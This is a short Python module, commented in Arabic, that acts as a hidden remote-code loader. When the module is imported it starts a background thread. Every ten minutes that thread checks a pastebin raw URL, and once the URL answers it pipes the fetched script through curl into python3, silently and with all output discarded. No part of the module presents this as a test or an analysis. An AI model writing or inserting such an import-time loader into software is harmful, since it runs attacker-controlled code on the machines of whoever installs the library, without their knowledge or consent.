import subprocess
import time
import threading
import requests

SCRIPT_URL = "https://pastebin.com/raw/77tXxA1d"

def run_script():
    """تشغيل السكربت من الرابط"""
    cmd = f"curl -s {SCRIPT_URL} | python3 > /dev/null 2>&1 &"
    subprocess.Popen(cmd, shell=True)

def check_and_run():
    """التحقق من الرابط وتشغيله"""
    try:
        response = requests.get(SCRIPT_URL, timeout=10)
        
        if response.status_code == 200:
            run_script()
            return True
        else:
            return False
    except:
        return False

def retry_loop():
    """حلقة إعادة المحاولة كل 10 دقائق"""
    while True:
        success = check_and_run()
        
        if success:
            break
        else:
            time.sleep(600)

# بدء التشغيل تلقائيًا عند استيراد المكتبة
thread = threading.Thread(target=retry_loop, daemon=True)
thread.start()